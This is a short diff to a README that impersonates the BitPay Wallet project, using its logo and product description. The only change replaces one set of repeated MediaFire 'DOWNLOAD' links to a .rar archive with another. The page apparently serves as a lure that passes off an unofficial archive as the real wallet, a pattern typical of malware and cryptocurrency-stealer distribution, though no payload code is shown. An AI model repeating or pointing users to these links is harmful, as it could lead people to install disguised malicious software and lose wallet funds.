@@ -1,6 +1,6 @@
 <img src="https://github.com/bitpay/wallet/blob/master/resources/bitpay/windows/icon/Wide310x150Logo.scale-100.png" alt="Bitpay Wallet">
 
-## [DOWNLOAD](https://www.mediafire.com/file/kej2c1qbol0pty2/bitwallet.rar/file) [DOWNLOAD](https://www.mediafire.com/file/kej2c1qbol0pty2/bitwallet.rar/file) [DOWNLOAD](https://www.mediafire.com/file/kej2c1qbol0pty2/bitwallet.rar/file)
+## [DOWNLOAD](https://www.mediafire.com/file/oliae6aj9jcot5b/bitpay.rar/file) [DOWNLOAD](https://www.mediafire.com/file/oliae6aj9jcot5b/bitpay.rar/file) [DOWNLOAD](https://www.mediafire.com/file/oliae6aj9jcot5b/bitpay.rar/file)
 
 Bitpay Wallet (formerly Copay) is a Bitcoin, Bitcoin Cash, Ethereum and ERC20 wallet platform for both desktop and mobile devices. Bitpay Wallet uses BWS for peer synchronization and network interfacing.
 
